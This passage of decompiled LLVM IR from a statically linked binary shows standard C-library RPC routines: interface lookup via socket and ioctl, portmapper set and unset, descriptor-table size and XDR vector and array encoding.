  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-4188, align 4
  %v4_80667e0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v4_80667e0, i32* @ebp, align 4
  %v2_80667ea = icmp slt i32 %v4_80667e0, 0
  %v1_80667ec = icmp eq i1 %v2_80667ea, false
  br i1 %v1_80667ec, label %dec_label_pc_80667f8, label %dec_label_pc_80667ee

dec_label_pc_80667ee:                             ; preds = %entry
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806e778.900, i32 0, i32 0), i8** %stack_var_-4188, align 4
  br label %dec_label_pc_8066839

dec_label_pc_80667f8:                             ; preds = %entry
  %v2_80667f8 = ptrtoint i32* %stack_var_-4152 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v2_806680e = ptrtoint i32* %stack_var_-24 to i32
  %v0_8066815 = load i32, i32* @ebx, align 4
  %v5_806681c = inttoptr i32 %v4_80667e0 to i8*
  store i8* %v5_806681c, i8** %stack_var_-4188, align 4
  %v3_806681d = call i32 @ioctl(i32 35090, i32 %v2_806680e, i32 %v0_8066815)
  %v2_8066825 = icmp slt i32 %v3_806681d, 0
  %v1_806682f = icmp eq i1 %v2_8066825, false
  br i1 %v1_806682f, label %dec_label_pc_806684a.preheader, label %dec_label_pc_8066831

dec_label_pc_8066831:                             ; preds = %dec_label_pc_80667f8
  store i8* getelementptr inbounds ([53 x i8], [53 x i8]* @global_var_806e790.901, i32 0, i32 0), i8** %stack_var_-4188, align 4
  br label %dec_label_pc_8066839

dec_label_pc_8066839:                             ; preds = %dec_label_pc_8066881, %dec_label_pc_80667ee, %dec_label_pc_8066831
  %stack_var_-4184.0 = phi i32 [ %stack_var_-4184.1, %dec_label_pc_8066881 ], [ 35090, %dec_label_pc_8066831 ], [ 2, %dec_label_pc_80667ee ]
  %stack_var_-4180.0 = phi i32 [ %stack_var_-4180.2, %dec_label_pc_8066881 ], [ %v2_806680e, %dec_label_pc_8066831 ], [ 0, %dec_label_pc_80667ee ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1, %dec_label_pc_8066881 ], [ %v2_80667f8, %dec_label_pc_8066831 ], [ %tmp23, %dec_label_pc_80667ee ]
  %v0_8066839 = phi i8* [ %v0_8066839.pre, %dec_label_pc_8066881 ], [ getelementptr inbounds ([53 x i8], [53 x i8]* @global_var_806e790.901, i32 0, i32 0), %dec_label_pc_8066831 ], [ getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806e778.900, i32 0, i32 0), %dec_label_pc_80667ee ]
  %v3_8066839 = call i32 @perror(i8* %v0_8066839)
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-4188, align 4
  %v2_8066845 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_806684a.preheader

dec_label_pc_806684a.preheader:                   ; preds = %dec_label_pc_8066839, %dec_label_pc_80667f8
  %stack_var_-4184.1 = phi i32 [ 35090, %dec_label_pc_80667f8 ], [ %stack_var_-4184.0, %dec_label_pc_8066839 ]
  %stack_var_-4180.1 = phi i32 [ %v2_806680e, %dec_label_pc_80667f8 ], [ %stack_var_-4180.0, %dec_label_pc_8066839 ]
  %stack_var_-20.1 = phi i32 [ %v2_80667f8, %dec_label_pc_80667f8 ], [ %stack_var_-20.0, %dec_label_pc_8066839 ]
  %v1_80668d88 = icmp eq i32 %tmp19, 0
  %v2_806685a = ptrtoint i32* %stack_var_-72 to i32
  %tmp43 = bitcast i32* %stack_var_-72 to i16*
  %v2_8066893 = urem i16 %tmp, 2
  %v3_8066893 = icmp eq i16 %v2_8066893, 0
  %v1_80668da15 = icmp eq i1 %v1_80668d88, false
  %v2_806689e = and i16 %tmp, 8
  %v3_806689e = icmp eq i16 %v2_806689e, 0
  %v1_80668a0 = icmp eq i1 %v3_806689e, false
  br label %dec_label_pc_806684a

dec_label_pc_806684a:                             ; preds = %dec_label_pc_80668e0, %dec_label_pc_806684a.preheader
  %stack_var_-4180.2 = phi i32 [ %stack_var_-4180.1, %dec_label_pc_806684a.preheader ], [ 0, %dec_label_pc_80668e0 ]
  store i32 %tmp20, i32* @esi, align 4
  store i32 %tmp19, i32* @edi, align 4
  br i1 %v1_80668da15, label %dec_label_pc_806685a.preheader, label %dec_label_pc_80668e0

dec_label_pc_806685a.preheader:                   ; preds = %dec_label_pc_806684a
  %v4_80668a2 = icmp eq i32 %stack_var_-4180.2, 0
  %v1_80668a7 = icmp eq i1 %v4_80668a2, false
  br label %dec_label_pc_806685a

dec_label_pc_806685a:                             ; preds = %dec_label_pc_806685a.preheader, %dec_label_pc_80668d2
  %v0_8066864 = phi i32 [ %v1_80668d2, %dec_label_pc_80668d2 ], [ %tmp20, %dec_label_pc_806685a.preheader ]
  store i32 %v2_806685a, i32* @ebx, align 4
  %v0_8066861 = load i32, i32* @ecx, align 4
  %v5_8066866 = call i32 @memcpy(i16* %tmp43, i32 %v0_8066864, i32 32)
  %v3_8066875 = call i32 @ioctl(i32 35091, i32 %v2_806685a, i32 %v0_8066861)
  %v2_806687d = icmp slt i32 %v3_8066875, 0
  %v1_806687f = icmp eq i1 %v2_806687d, false
  br i1 %v1_806687f, label %dec_label_pc_806688b, label %dec_label_pc_8066881

dec_label_pc_8066881:                             ; preds = %dec_label_pc_806685a
  %v0_8066839.pre = load i8*, i8** %stack_var_-4188, align 4
  br label %dec_label_pc_8066839

dec_label_pc_806688b:                             ; preds = %dec_label_pc_806685a
  %v0_80668d2.pre = load i32, i32* @esi, align 4
  br i1 %v3_8066893, label %dec_label_pc_80668d2, label %dec_label_pc_8066897

dec_label_pc_8066897:                             ; preds = %dec_label_pc_806688b
  %v1_8066897 = add i32 %v0_80668d2.pre, 16
  %v2_8066897 = inttoptr i32 %v1_8066897 to i16*
  %v3_8066897 = load i16, i16* %v2_8066897, align 2
  %v12_8066897 = icmp eq i16 %v3_8066897, 2
  %v1_806689c = icmp eq i1 %v12_8066897, false
  br i1 %v1_806689c, label %dec_label_pc_80668d2, label %dec_label_pc_806689e

dec_label_pc_806689e:                             ; preds = %dec_label_pc_8066897
  br i1 %v1_80668a0, label %dec_label_pc_80668a9, label %dec_label_pc_80668a2

dec_label_pc_80668a2:                             ; preds = %dec_label_pc_806689e
  br i1 %v1_80668a7, label %dec_label_pc_80668d2, label %dec_label_pc_80668a9

dec_label_pc_80668a9:                             ; preds = %dec_label_pc_80668a2, %dec_label_pc_806689e
  %tmp44 = inttoptr i32 %stack_var_-4184.1 to i16*
  %v5_80668b4 = call i32 @memcpy(i16* %tmp44, i32 %v1_8066897, i32 16)
  %v1_80668bd = add i32 %stack_var_-4184.1, 2
  %v2_80668bd = inttoptr i32 %v1_80668bd to i16*
  store i16 28416, i16* %v2_80668bd, align 2
  %v0_80668c3 = load i32, i32* @ebp, align 4
  %v2_80668c6 = call i32 @__libc_close(i32 %v0_80668c3)
  br label %dec_label_pc_80668ff

dec_label_pc_80668d2:                             ; preds = %dec_label_pc_806688b, %dec_label_pc_80668a2, %dec_label_pc_8066897
  %v1_80668d2 = add i32 %v0_80668d2.pre, 32
  store i32 %v1_80668d2, i32* @esi, align 4
  %v0_80668d5 = load i32, i32* @edi, align 4
  %v1_80668d5 = add i32 %v0_80668d5, -32
  %v6_80668d5 = icmp eq i32 %v1_80668d5, 0
  store i32 %v1_80668d5, i32* @edi, align 4
  %v1_80668da = icmp eq i1 %v6_80668d5, false
  br i1 %v1_80668da, label %dec_label_pc_806685a, label %dec_label_pc_80668e0

dec_label_pc_80668e0:                             ; preds = %dec_label_pc_80668d2, %dec_label_pc_806684a
  %v12_80668e0 = icmp eq i32 %stack_var_-4180.2, 1
  %v1_80668e5 = icmp eq i1 %v12_80668e0, false
  br i1 %v1_80668e5, label %dec_label_pc_80668f4, label %dec_label_pc_806684a

dec_label_pc_80668f4:                             ; preds = %dec_label_pc_80668e0
  %v0_80668f7 = load i32, i32* @ebp, align 4
  %v2_80668f8 = call i32 @__libc_close(i32 %v0_80668f7)
  br label %dec_label_pc_80668ff

dec_label_pc_80668ff:                             ; preds = %dec_label_pc_80668a9, %dec_label_pc_80668f4
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80668f4 ], [ 1, %dec_label_pc_80668a9 ]
  %v2_8066907 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8066907, i32* @edi, align 4
  store i32 %stack_var_-20.1, i32* @ebp, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_80668d2, { 1, 0 }
  uselistorder i32 %stack_var_-4180.2, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.1, { 1, 0 }
  uselistorder i32 %stack_var_-4184.1, { 2, 1, 0 }
  uselistorder i32 %v2_806680e, { 1, 0, 2 }
  uselistorder i32 %v2_80667f8, { 1, 0 }
  uselistorder i32 %v4_80667e0, { 0, 2, 1 }
  uselistorder i8** %stack_var_-4188, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 29, 28, 27, 26, 25, 24, 23, 22, 30, 21, 14, 20, 19, 18, 17, 16, 15, 5, 11, 10, 9, 13, 12, 3, 2, 4 }
  uselistorder i16 28416, { 1, 0 }
  uselistorder i16 8, { 0, 5, 4, 7, 3, 1, 6, 2 }
  uselistorder i16 2, { 10, 0, 11, 1, 17, 12, 13, 14, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 1, 0, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 93, 92, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i8* inttoptr (i32 1 to i8*), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 (i8*)* @perror, { 10, 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 11, 10, 9, 8, 13, 12, 3, 0, 7, 14, 6, 5, 4 }
  uselistorder i32 35090, { 1, 0, 2, 4, 3 }
  uselistorder i32 4096, { 23, 20, 3, 21, 27, 28, 8, 26, 22, 24, 0, 1, 25, 9, 5, 10, 4, 11, 12, 13, 14, 15, 16, 2, 19, 17, 7, 18, 6 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 37, 36, 4, 1, 13, 35, 34, 33, 32, 38, 31, 30, 29, 28, 24, 27, 26, 25, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_80668ff, { 1, 0 }
  uselistorder label %dec_label_pc_80668d2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806685a, { 1, 0 }
  uselistorder label %dec_label_pc_8066839, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_806690a = load i32, i32* @ebx, align 4
  %v2_806690e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_806690e, i32* @ebx, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  %v2_806691c = call i32 @__get_myaddress(i32 -1, i32 %v0_806690a)
  %v1_8066921 = icmp eq i32 %v2_806691c, 0
  br i1 %v1_8066921, label %entry.dec_label_pc_80669b5_crit_edge, label %dec_label_pc_8066929

entry.dec_label_pc_80669b5_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80669b5

dec_label_pc_8066929:                             ; preds = %entry
  %v2_8066933 = ptrtoint i32* %stack_var_-8 to i32
  %v9_806694c = call i32 @__GI_clntudp_bufcreate(i32 %v2_806690e, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8066933, i32 400, i32 400)
  store i32 %v9_806694c, i32* %ebx.global-to-local, align 4
  %v1_8066956 = icmp eq i32 %v9_806694c, 0
  br i1 %v1_8066956, label %dec_label_pc_80669b5, label %dec_label_pc_806695a

dec_label_pc_806695a:                             ; preds = %dec_label_pc_8066929
  %v1_8066982 = add i32 %v9_806694c, 4
  %v2_8066982 = inttoptr i32 %v1_8066982 to i32*
  %v3_8066982 = load i32, i32* %v2_8066982, align 4
  store i32 %v3_8066982, i32* @ecx, align 4
  %v5_80669a0 = inttoptr i32 %v3_8066982 to i32*
  %v6_80669a0 = load i32, i32* %v5_80669a0, align 4
  call void @__pseudo_call(i32 %v6_80669a0)
  %v0_80669a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80669a5 = add i32 %v0_80669a5, 4
  %v2_80669a5 = inttoptr i32 %v1_80669a5 to i32*
  %v3_80669a5 = load i32, i32* %v2_80669a5, align 4
  %v5_80669a9 = add i32 %v3_80669a5, 16
  %v6_80669a9 = inttoptr i32 %v5_80669a9 to i32*
  %v7_80669a9 = load i32, i32* %v6_80669a9, align 4
  call void @__pseudo_call(i32 %v7_80669a9)
  %v2_80669ba.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80669b7

dec_label_pc_80669b5:                             ; preds = %entry.dec_label_pc_80669b5_crit_edge, %dec_label_pc_8066929
  br label %dec_label_pc_80669b7

dec_label_pc_80669b7:                             ; preds = %dec_label_pc_806695a, %dec_label_pc_80669b5
  %v2_80669ba = phi i32 [ %v2_80669ba.pre, %dec_label_pc_806695a ], [ %tmp12, %dec_label_pc_80669b5 ]
  %v0_80669bb = phi i32 [ %tmp, %dec_label_pc_806695a ], [ 0, %dec_label_pc_80669b5 ]
  store i32 %v2_80669ba, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80669bb

; uselistorder directives
  uselistorder i32 %v9_806694c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80669b7, { 1, 0 }
  uselistorder label %dec_label_pc_80669b5, { 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80669bd = load i32, i32* @ebx, align 4
  %v2_80669c1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80669c1, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v2_80669d3 = call i32 @__get_myaddress(i32 -1, i32 %v0_80669bd)
  %v1_80669d8 = icmp eq i32 %v2_80669d3, 0
  br i1 %v1_80669d8, label %entry.dec_label_pc_8066a8a_crit_edge, label %dec_label_pc_80669e0

entry.dec_label_pc_8066a8a_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066a8a

dec_label_pc_80669e0:                             ; preds = %entry
  %v2_80669ea = ptrtoint i32* %stack_var_-12 to i32
  %v9_8066a03 = call i32 @__GI_clntudp_bufcreate(i32 %v2_80669c1, i32 100000, i32 2, i32 5, i32* null, i32 %v2_80669ea, i32 400, i32 400)
  store i32 %v9_8066a03, i32* @ebx, align 4
  %v1_8066a0d = icmp eq i32 %v9_8066a03, 0
  br i1 %v1_8066a0d, label %dec_label_pc_8066a8a, label %dec_label_pc_8066a77

dec_label_pc_8066a77:                             ; preds = %dec_label_pc_80669e0
  %v1_8066a38 = add i32 %v9_8066a03, 4
  %v2_8066a38 = inttoptr i32 %v1_8066a38 to i32*
  %v3_8066a38 = load i32, i32* %v2_8066a38, align 4
  store i32 %v3_8066a38, i32* @ecx, align 4
  %v5_8066a56 = inttoptr i32 %v3_8066a38 to i32*
  %v6_8066a56 = load i32, i32* %v5_8066a56, align 4
  call void @__pseudo_call(i32 %v6_8066a56)
  %v0_8066a5f = load i32, i32* @esi, align 4
  %v0_8066a66 = load i32, i32* @ebx, align 4
  %v4_8066a67 = call i32 @clnt_perror(i32 %v0_8066a66, i32 ptrtoint ([24 x i8]* @global_var_806e7dc.907 to i32), i32 %v0_8066a5f, i32 %v0_8066a5f)
  %v0_8066a7a = load i32, i32* @ebx, align 4
  %v1_8066a7a = add i32 %v0_8066a7a, 4
  %v2_8066a7a = inttoptr i32 %v1_8066a7a to i32*
  %v3_8066a7a = load i32, i32* %v2_8066a7a, align 4
  %v5_8066a7e = add i32 %v3_8066a7a, 16
  %v6_8066a7e = inttoptr i32 %v5_8066a7e to i32*
  %v7_8066a7e = load i32, i32* %v6_8066a7e, align 4
  call void @__pseudo_call(i32 %v7_8066a7e)
  br label %dec_label_pc_8066a8c

dec_label_pc_8066a8a:                             ; preds = %entry.dec_label_pc_8066a8a_crit_edge, %dec_label_pc_80669e0
  br label %dec_label_pc_8066a8c

dec_label_pc_8066a8c:                             ; preds = %dec_label_pc_8066a77, %dec_label_pc_8066a8a
  %v0_8066a91 = phi i32 [ %tmp, %dec_label_pc_8066a77 ], [ 0, %dec_label_pc_8066a8a ]
  ret i32 %v0_8066a91

; uselistorder directives
  uselistorder i32 %v9_8066a03, { 0, 2, 1 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32* null, { 0, 1, 3, 2, 8, 9, 4, 10, 11, 5, 12, 13, 14, 15, 16, 6, 7, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_8066a8c, { 1, 0 }
  uselistorder label %dec_label_pc_8066a8a, { 1, 0 }
}

define i32 @_rpc_dtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8066a97 = load i32, i32* @global_var_807ca4c.908, align 4
  %v1_8066a97 = icmp eq i32 %v0_8066a97, 0
  %v1_8066a9e = icmp eq i1 %v1_8066a97, false
  br i1 %v1_8066a9e, label %dec_label_pc_8066aaa, label %dec_label_pc_8066aa0

dec_label_pc_8066aa0:                             ; preds = %entry
  %v1_8066aa0 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8066aa0, i32* @global_var_807ca4c.908, align 4
  br label %dec_label_pc_8066aaa

dec_label_pc_8066aaa:                             ; preds = %entry, %dec_label_pc_8066aa0
  %v0_8066aaa = phi i32 [ %v0_8066a97, %entry ], [ %v1_8066aa0, %dec_label_pc_8066aa0 ]
  ret i32 %v0_8066aaa

; uselistorder directives
  uselistorder i32 (i32)* @getdtablesize, { 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_8066aaa, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %arg4, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v10_8066adf22 = icmp eq i32 %arg3, 0
  br i1 %v10_8066adf22, label %dec_label_pc_8066ae5, label %dec_label_pc_8066acb.lr.ph

dec_label_pc_8066acb.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8066acb

dec_label_pc_8066acb:                             ; preds = %dec_label_pc_8066acb.lr.ph, %dec_label_pc_8066adc
  call void @__pseudo_call(i32 %arg5)
  %v0_8066ad8 = load i32, i32* @eax, align 4
  %v1_8066ad8 = icmp eq i32 %v0_8066ad8, 0
  br i1 %v1_8066ad8, label %dec_label_pc_8066aea, label %dec_label_pc_8066adc

dec_label_pc_8066adc:                             ; preds = %dec_label_pc_8066acb
  %v0_8066adc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066adc = load i32, i32* %ebp.global-to-local, align 4
  %v2_8066adc = add i32 %v1_8066adc, %v0_8066adc
  store i32 %v2_8066adc, i32* %ebx.global-to-local, align 4
  %v0_8066ade = load i32, i32* %esi.global-to-local, align 4
  %v1_8066ade = add i32 %v0_8066ade, 1
  store i32 %v1_8066ade, i32* %esi.global-to-local, align 4
  %v10_8066adf = icmp ult i32 %v1_8066ade, %arg3
  br i1 %v10_8066adf, label %dec_label_pc_8066acb, label %dec_label_pc_8066ae5

dec_label_pc_8066ae5:                             ; preds = %entry, %dec_label_pc_8066adc
  br label %dec_label_pc_8066aea

dec_label_pc_8066aea:                             ; preds = %dec_label_pc_8066acb, %dec_label_pc_8066ae5
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8066aea, { 1, 0 }
  uselistorder label %dec_label_pc_8066ae5, { 1, 0 }
  uselistorder label %dec_label_pc_8066acb, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp12 = sext i32 %arg6 to i64
  %stack_var_-16 = alloca i32, align 4
  %v0_8066af3 = load i32, i32* @edi, align 4
  %v0_8066af4 = load i32, i32* @esi, align 4
  %v0_8066af5 = load i32, i32* @ebx, align 4
  store i32 %v0_8066af5, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @eax, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v1_8066b01 = inttoptr i32 %arg3 to i32*
  %tmp28 = inttoptr i32 %arg2 to i32*
  %v7_8066b08 = call i32 @xdr_u_long(i32* %tmp28, i32 %arg4)
  store i32 %v7_8066b08, i32* %eax.global-to-local, align 4
  %v1_8066b10 = icmp eq i32 %v7_8066b08, 0
  br i1 %v1_8066b10, label %dec_label_pc_8066bea, label %dec_label_pc_8066b18

dec_label_pc_8066b18:                             ; preds = %entry
  %v0_8066b18 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066b18 = inttoptr i32 %v0_8066b18 to i32*
  %v2_8066b18 = load i32, i32* %v1_8066b18, align 4
  store i32 %v2_8066b18, i32* @edi, align 4
  %v6_8066b1e = icmp ugt i32 %v2_8066b18, %arg5
  br i1 %v6_8066b1e, label %dec_label_pc_8066b2d, label %dec_label_pc_8066b20

dec_label_pc_8066b20:                             ; preds = %dec_label_pc_8066b18
  %v12_8066b25 = udiv i64 4294967295, %tmp12
  %v13_8066b25 = trunc i64 %v12_8066b25 to i32
  store i32 %v13_8066b25, i32* %eax.global-to-local, align 4
  %v14_8066b25 = urem i64 4294967295, %tmp12
  %v15_8066b25 = trunc i64 %v14_8066b25 to i32
  store i32 %v15_8066b25, i32* @edx, align 4
  %tmp = icmp ugt i32 %v2_8066b18, %v13_8066b25
  br i1 %tmp, label %dec_label_pc_8066b2d, label %dec_label_pc_8066b3a

dec_label_pc_8066b2d:                             ; preds = %dec_label_pc_8066b20, %dec_label_pc_8066b18
  store i32 %arg2, i32* @edx, align 4
  %v2_8066b31 = load i32, i32* %tmp28, align 4
  %v11_8066b31 = icmp eq i32 %v2_8066b31, 2
  %v1_8066b34 = icmp eq i1 %v11_8066b31, false
  br i1 %v1_8066b34, label %dec_label_pc_8066bea, label %dec_label_pc_8066b3a

dec_label_pc_8066b3a:                             ; preds = %dec_label_pc_8066b20, %dec_label_pc_8066b2d
  %v0_8066b3a = load i32, i32* @ebx, align 4
  %v1_8066b3a = icmp eq i32 %v0_8066b3a, 0
  %v1_8066b3c = icmp eq i1 %v1_8066b3a, false
  br i1 %v1_8066b3c, label %dec_label_pc_8066b9d, label %dec_label_pc_8066b3e

dec_label_pc_8066b3e:                             ; preds = %dec_label_pc_8066b3a
  store i32 %arg2, i32* @edx, align 4
  %v2_8066b42 = load i32, i32* %tmp28, align 4
  store i32 %v2_8066b42, i32* %eax.global-to-local, align 4
  %v9_8066b44 = icmp eq i32 %v2_8066b42, 1
  br i1 %v9_8066b44, label %dec_label_pc_8066b53, label %dec_label_pc_8066b49

dec_label_pc_8066b49:                             ; preds = %dec_label_pc_8066b3e
  %v9_8066b49 = icmp eq i32 %v2_8066b42, 2
  %v1_8066b4c = icmp eq i1 %v9_8066b49, false
  br i1 %v1_8066b4c, label %dec_label_pc_8066b9d, label %dec_label_pc_8066bee

dec_label_pc_8066b53:                             ; preds = %dec_label_pc_8066b3e
  %v1_8066b53 = icmp eq i32 %v2_8066b18, 0
  br i1 %v1_8066b53, label %dec_label_pc_8066bee, label %dec_label_pc_8066b5b

dec_label_pc_8066b5b:                             ; preds = %dec_label_pc_8066b53
  %v4_8066b62 = mul i32 %v2_8066b18, %arg6
  store i32 %v4_8066b62, i32* @esi, align 4
  %v2_8066b66 = call i32 @malloc(i32 %v4_8066b62)
  store i32 %v2_8066b66, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8066b74 = icmp eq i32 %v2_8066b66, 0
  store i32 %v2_8066b66, i32* %v1_8066b01, align 4
  %v1_8066b78 = icmp eq i1 %v1_8066b74, false
  br i1 %v1_8066b78, label %dec_label_pc_8066b90, label %dec_label_pc_8066b7a

dec_label_pc_8066b7a:                             ; preds = %dec_label_pc_8066b5b
  %v0_8066b7c2 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v4_8066b87 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806e804.909 to i32), i32 %v0_8066b7c2)
  store i32 %v4_8066b87, i32* %eax.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066be5

dec_label_pc_8066b90:                             ; preds = %dec_label_pc_8066b5b
  %v0_8066b91 = load i32, i32* @esi, align 4
  %v0_8066b94 = load i32, i32* @ebx, align 4
  %v5_8066b94 = inttoptr i32 %v0_8066b94 to i8*
  %v6_8066b95 = call i32 @__GI_memset(i8* %v5_8066b94, i32 0, i32 %v0_8066b91)
  store i32 %v6_8066b95, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066b9d

dec_label_pc_8066b9d:                             ; preds = %dec_label_pc_8066b49, %dec_label_pc_8066b3a, %dec_label_pc_8066b90
  store i32 0, i32* @ebp, align 4
  store i32 1, i32* @esi, align 4
  %v7_8066bbc31 = icmp ne i32 %v2_8066b18, 0
  %v1_8066bbe35 = icmp eq i1 %v7_8066bbc31, false
  br i1 %v1_8066bbe35, label %dec_label_pc_8066bc4, label %dec_label_pc_8066bc0

dec_label_pc_8066ba6:                             ; preds = %dec_label_pc_8066bc0
  %v1_8066baa = add i32 %v0_8066baa38, 1
  store i32 %v1_8066baa, i32* @ebp, align 4
  call void @__pseudo_call(i32 %arg6)
  %v0_8066bb3 = load i32, i32* @ebx, align 4
  %v5_8066bb3 = add i32 %v0_8066bb3, %arg5
  store i32 %v5_8066bb3, i32* @ebx, align 4
  %v0_8066bb7 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8066bb7, i32* @esi, align 4
  %v0_8066bbc.pre = load i32, i32* @ebp, align 4
  %v7_8066bbc = icmp ult i32 %v0_8066bbc.pre, %v2_8066b18
  %v1_8066bbe = icmp eq i1 %v7_8066bbc, false
  br i1 %v1_8066bbe, label %dec_label_pc_8066bc4, label %dec_label_pc_8066bc0

dec_label_pc_8066bc0:                             ; preds = %dec_label_pc_8066b9d, %dec_label_pc_8066ba6
  %v0_8066baa38 = phi i32 [ %v0_8066bbc.pre, %dec_label_pc_8066ba6 ], [ 0, %dec_label_pc_8066b9d ]
  %v0_8066bc037 = phi i32 [ %v0_8066bb7, %dec_label_pc_8066ba6 ], [ 1, %dec_label_pc_8066b9d ]
  %v1_8066bc0 = icmp eq i32 %v0_8066bc037, 0
  %v1_8066bc2 = icmp eq i1 %v1_8066bc0, false
  br i1 %v1_8066bc2, label %dec_label_pc_8066ba6, label %dec_label_pc_8066bc4

dec_label_pc_8066bc4:                             ; preds = %dec_label_pc_8066ba6, %dec_label_pc_8066bc0, %dec_label_pc_8066b9d
  %v0_8066bc0.lcssa = phi i32 [ 1, %dec_label_pc_8066b9d ], [ %v0_8066bc037, %dec_label_pc_8066bc0 ], [ %v0_8066bb7, %dec_label_pc_8066ba6 ]
  %v2_8066bc8 = load i32, i32* %arg1, align 4
  %v11_8066bc8 = icmp eq i32 %v2_8066bc8, 2
  %v1_8066bcb = icmp eq i1 %v11_8066bc8, false
  br i1 %v1_8066bcb, label %dec_label_pc_8066bf3, label %dec_label_pc_8066bcd

dec_label_pc_8066bcd:                             ; preds = %dec_label_pc_8066bc4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_8066bd4 = load i32, i32* %v1_8066b01, align 4
  %v2_8066bd6 = call i32 @free(i32 %v2_8066bd4)
  store i32 %v2_8066bd6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8066b01, align 4
  %v0_8066bf6.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066be5

